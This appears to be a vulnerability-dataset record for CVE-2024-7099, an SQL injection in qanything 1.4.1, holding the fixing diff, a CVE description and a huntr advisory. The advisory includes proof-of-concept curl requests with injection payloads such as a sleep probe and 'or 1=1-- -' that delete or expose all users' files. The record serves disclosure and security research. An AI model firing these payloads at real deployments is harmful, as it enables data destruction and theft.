{
    "CVE-2024-7099": {
        "published_date": "2024-10-13T21:09:53.816Z",
        "patch_commits": [
            {
                "url": "https://github.com/netease-youdao/qanything/commit/a87354f09d93e95350fb45eb343dc75454387554",
                "content": "Update mysql_client.py\n\nSQL injection vulnerability fixed.\n\nFilename: qanything_kernel/connector/database/mysql/mysql_client.py:\n```\n@@ -123,7 +123,12 @@\ndef create_tables_(self):\n                 debug_logger.info(e)\n             else:\n                 raise e\n-        \n+    \n+    def placeholders(self,query,data):\n+        data = data if isinstance(data,list) else [data]\n+        placeholders=','.join(['%s'] * len(data))\n+        return query.format(placeholders)\n+    \n     def check_user_exist_(self, user_id):\n         query = \"SELECT user_id FROM User WHERE user_id = %s\"\n         result = self.execute_query_(query, (user_id,), fetch=True)\n\n@@ -132,9 +137,8 @@\ndef check_user_exist_(self, user_id):\n \n     def check_kb_exist(self, user_id, kb_ids):\n         # 使用参数化查询\n-        placeholders = ','.join(['%s'] * len(kb_ids))\n-        query = \"SELECT kb_id FROM KnowledgeBase WHERE kb_id IN ({}) AND deleted = 0 AND user_id = %s\".format(\n-            placeholders)\n+        query = \"SELECT kb_id FROM KnowledgeBase WHERE kb_id IN ({}) AND deleted = 0 AND user_id = %s\"\n+        query = self.placeholders(query,kb_ids)\n         query_params = kb_ids + [user_id]\n         result = self.execute_query_(query, query_params, fetch=True)\n         debug_logger.info(\"check_kb_exist {}\".format(result))\n\n@@ -144,9 +148,10 @@\ndef check_kb_exist(self, user_id, kb_ids):\n \n     def get_file_by_status(self, kb_ids, status):\n         # query = \"SELECT file_name FROM File WHERE kb_id = %s AND deleted = 0 AND status = %s\"\n-        kb_ids_str = ','.join(\"'{}'\".format(str(x)) for x in kb_ids)\n-        query = \"SELECT file_id, file_name FROM File WHERE kb_id IN ({}) AND deleted = 0 AND status = %s\".format(kb_ids_str)\n-        result = self.execute_query_(query, (status,), fetch=True)\n+        query = \"SELECT file_id, file_name FROM File WHERE kb_id IN ({}) AND deleted = 0 AND status = %s\"\n+        query = self.placeholders(query,kb_ids)\n+        query_params = kb_ids + [status]\n+        result = self.execute_query_(query, query_params, fetch=True)\n         # result = self.execute_query_(query, (kb_id, \"gray\"), fetch=True)\n         return result\n\n@@ -156,13 +161,14 @@\ndef check_file_exist(self, user_id, kb_id, file_ids):\n             debug_logger.info(\"check_file_exist skipped because of empty file_ids\")\n             return []\n         \n-        file_ids_str = ','.join(\"'{}'\".format(str(x)) for x in file_ids)\n         query = \"\"\"SELECT file_id, status FROM File \n                  WHERE deleted = 0\n                  AND file_id IN ({})\n                  AND kb_id = %s \n-                 AND kb_id IN (SELECT kb_id FROM KnowledgeBase WHERE user_id = %s)\"\"\".format(file_ids_str)\n-        result = self.execute_query_(query, (kb_id, user_id), fetch=True)\n+                 AND kb_id IN (SELECT kb_id FROM KnowledgeBase WHERE user_id = %s)\"\"\"\n+        query = self.placeholders(query,file_ids)\n+        query_params = file_ids + [kb_id, user_id]\n+        result = self.execute_query_(query,query_params, fetch=True)\n         debug_logger.info(\"check_file_exist {}\".format(result))\n         return result\n\n@@ -173,15 +179,15 @@\ndef check_file_exist_by_name(self, user_id, kb_id, file_names):\n         # 分批处理file_names\n         for i in range(0, len(file_names), batch_size):\n             batch_file_names = file_names[i:i + batch_size]\n-            placeholders = ','.join(['%s'] * len(batch_file_names))\n+\n             query = \"\"\"\n                 SELECT file_id, file_name, file_size, status FROM File \n                 WHERE deleted = 0\n                 AND file_name IN ({})\n                 AND kb_id = %s \n                 AND kb_id IN (SELECT kb_id FROM KnowledgeBase WHERE user_id = %s)\n-            \"\"\".format(placeholders)\n-\n+            \"\"\"\n+            query = self.placeholders(query,batch_file_names)\n             query_params = batch_file_names + [kb_id, user_id]\n             batch_result = self.execute_query_(query, query_params, fetch=True)\n             debug_logger.info(\"check_file_exist_by_name batch {}: {}\".format(i // batch_size, batch_result))\n\n@@ -214,21 +220,22 @@\ndef get_users(self):\n     # [知识库] 获取指定kb_ids的知识库\n     def get_knowledge_base_name(self, kb_ids):\n         # 使用参数化查询\n-        placeholders = ','.join(['%s'] * len(kb_ids))\n-        query = \"SELECT user_id, kb_id, kb_name FROM KnowledgeBase WHERE kb_id IN ({}) AND deleted = 0\".format(placeholders)\n+        query = \"SELECT user_id, kb_id, kb_name FROM KnowledgeBase WHERE kb_id IN ({}) AND deleted = 0\"\n+        query = self.placeholders(query,kb_ids)\n         query_params = kb_ids\n         return self.execute_query_(query, query_params, fetch=True)\n \n     # [知识库] 删除指定知识库\n     def delete_knowledge_base(self, user_id, kb_ids):\n         # 使用参数化查询\n-        placeholders = ','.join(['%s'] * len(kb_ids))\n-        query = \"UPDATE KnowledgeBase SET deleted = 1 WHERE user_id = %s AND kb_id IN ({})\".format(placeholders)\n+        query = \"UPDATE KnowledgeBase SET deleted = 1 WHERE user_id = %s AND kb_id IN ({})\"\n+        query = self.placeholders(query,kb_ids)\n         query_params = [user_id] + kb_ids\n         self.execute_query_(query, query_params, commit=True)\n \n         # 更新文件的删除状态也需要使用参数化查询\n-        query = \"UPDATE File SET deleted = 1 WHERE kb_id IN ({}) AND kb_id IN (SELECT kb_id FROM KnowledgeBase WHERE user_id = %s)\".format(placeholders)\n+        query = \"UPDATE File SET deleted = 1 WHERE kb_id IN ({}) AND kb_id IN (SELECT kb_id FROM KnowledgeBase WHERE user_id = %s)\"\n+        query = self.placeholders(query,kb_ids)\n         debug_logger.info(\"delete_knowledge_base: {}\".format(kb_ids))\n         self.execute_query_(query, query_params, commit=True)\n\n@@ -272,9 +279,10 @@\ndef update_file_status(self, file_id, status):\n         self.execute_query_(query, (status, file_id), commit=True)\n \n     def from_status_to_status(self, file_ids, from_status, to_status):\n-        file_ids_str = ','.join(\"'{}'\".format(str(x)) for x in file_ids)\n-        query = \"UPDATE File SET status = %s WHERE file_id IN ({}) AND status = %s\".format(file_ids_str)\n-        self.execute_query_(query, (to_status, from_status), commit=True)\n+        query = \"UPDATE File SET status = %s WHERE file_id IN ({}) AND status = %s\"\n+        query = self.placeholders(query,file_ids)\n+        query_params = [to_status]+file_ids + [from_status]\n+        self.execute_query_(query,query_params, commit=True)\n         \n \n     # [文件] 获取指定知识库下面所有文件的id和名称\n\n@@ -284,7 +292,8 @@\ndef get_files(self, user_id, kb_id):\n \n     # [文件] 删除指定文件\n     def delete_files(self, kb_id, file_ids):\n-        file_ids_str = ','.join(\"'{}'\".format(str(x)) for x in file_ids)\n-        query = \"UPDATE File SET deleted = 1 WHERE kb_id = %s AND file_id IN ({})\".format(file_ids_str)\n+        query = \"UPDATE File SET deleted = 1 WHERE kb_id = %s AND file_id IN ({})\"\n+        query = self.placeholders(query,file_ids)\n+        query_params = [kb_id]+file_ids\n         debug_logger.info(\"delete_files: {}\".format(file_ids))\n-        self.execute_query_(query, (kb_id,), commit=True)\n+        self.execute_query_(query, query_params, commit=True)\n```"
            }
        ],
        "sw_version": "v1.4.1",
        "sw_version_wget": "https://github.com/netease-youdao/qanything/archive/refs/tags/v1.4.1.zip",
        "description": "netease-youdao/qanything version 1.4.1 contains a vulnerability where unsafe data obtained from user input is concatenated in SQL queries, leading to SQL injection. The affected functions include `get_knowledge_base_name`, `from_status_to_status`, `delete_files`, and `get_file_by_status`. An attacker can exploit this vulnerability to execute arbitrary SQL queries, potentially stealing information from the database. The issue is fixed in version 1.4.2.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/bc98983e-06cc-4a4b-be01-67e5010cb2c1",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nSQL Injection in netease-youdao/qanything\nValid\nReported on Jul 15th 2024\nDescription\nUnsafe data obtained from user input is being concatenated in many functions for string concatenation, leading to a security vulnerability known as SQL injection. A sample piece of code:\ndef delete_files(self, kb_id, file_ids):\n    file_ids_str = ','.join(\"'{}'\".format(str(x)) for x in file_ids)\n    query = \"UPDATE File SET deleted = 1 WHERE kb_id = %s AND file_id IN ({})\".format(file_ids_str)\n    debug_logger.info(\"delete_files: {}\".format(file_ids))\n    self.execute_query_(query, (kb_id,), commit=True)\nThe functions affected by this vulnerability are as follows: get_knowledge_base_name, from_status_to_status, delete_files, get_file_by_status\nProof of Concept\ncurl http://localhost:8777/api/local_doc_qa/delete_files -X POST -H \"Content-Type: application/json\" '{\"user_id\":\"zzp\", \"kb_id\": \"KB1271e71c36ec4028a6542586946a3906\", \"file_ids\": [ \"')  or (select sleep(3))-- -\"] }'     \nThe application will interpret this as:\nUPDATE File SET deleted = 1 WHERE kb_id = %s AND file_id IN ('')  or (select sleep(3))-- -')\ncurl http://localhost:8777/api/local_doc_qa/delete_files -X POST -H \"Content-Type: application/json\" '{\"user_id\":\"zzp\", \"kb_id\": \"KB1271e71c36ec4028a6542586946a3906\", \"file_ids\": [ \"') or 1=1-- -\"] }'\nWith , all files of all users are marked as deleted. This affects the integrity and availability of CVSS calculation.\ncurl http://localhost:8777/api/local_doc_qa/delete_files -X POST -H \"Content-Type: application/json\" '{\"user_id\":\"zzp\", \"kb_ids\": [ \"'or 1=1-- -\"] }'\nWith this, all deleted files can be viewed by the attacker. This also affects the confidentiality of CVSS calculation.\nImpact\nThe attacker can execute SQL queries, thereby stealing information from the database.\nOccurrences\nmysql_client.py L274-L277\nmysql_client.py L286-L290\nmysql_client.py L215-L220\nmysql_client.py L145-L151\nWe are processing your report and will contact thenetease-youdao/qanything team within 24 hours.10 months ago\nmvlttt modified the report10 months ago\nhuntr-helpermodified the Severity from Critical (9.8) to High (8.8)10 months ago\nmvlttt\ncommented10 months ago\nResearcher\nHi @huntr-helper , This vulnerability does not require user interaction. Why did you change it?\nWe have contacted a member of thenetease-youdao/qanything team and are waiting to hear back10 months ago\nmvlttt modified the report10 months ago\nWe have sent a follow up to the netease-youdao/qanything team. We will try again in 4 days.10 months ago\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nDan McInerney validated this vulnerability10 months ago\nmvlttthas been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-7028assigned to this report.10 months ago\nDan McInerneymarked this as fixedin 1.4.2with commita8735410 months ago\nThe fix bounty has been dropped\nmysql_client.py#L274-L277 has been validated\nmysql_client.py#L145-L151 has been validated\nmysql_client.py#L215-L220 has been validated\nmysql_client.py#L286-L290 has been validated\nA huntr admin reset this report to a pending state.10 months ago\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nBen Harvie validated this vulnerability10 months ago\nmvlttthas been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-7099assigned to this report.10 months ago\nBen Harviemarked this as fixedin 1.4.2with commita8735410 months ago\nmvlttthas been awarded the fix bounty\nmysql_client.py#L215-L220 has been validated\nmysql_client.py#L286-L290 has been validated\nmysql_client.py#L274-L277 has been validated\nmysql_client.py#L145-L151 has been validated\nWe have sent a warning to the netease-youdao/qanything team to inform them that this report will be published in 48 hours7 months ago\nThis vulnerability has now been published7 months ago\nCVE-2024-7099has now been published7 months ago\nSign in to join this conversation\nCVE\nCVE-2024-7099\n(Published)\nVulnerability Type\nCWE-89: SQL Injection\nSeverity\nCritical (9.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator\nRegistry\nOther\nAffected Version\n1.4.1\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$1440\nFix Bounty\n$225\nFound by\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\n© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The advisory includes curl commands that demonstrate how to exploit the vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-89",
                "value": "CWE-89 Improper Neutralization of Special Elements used in an SQL Command"
            }
        ]
    }
}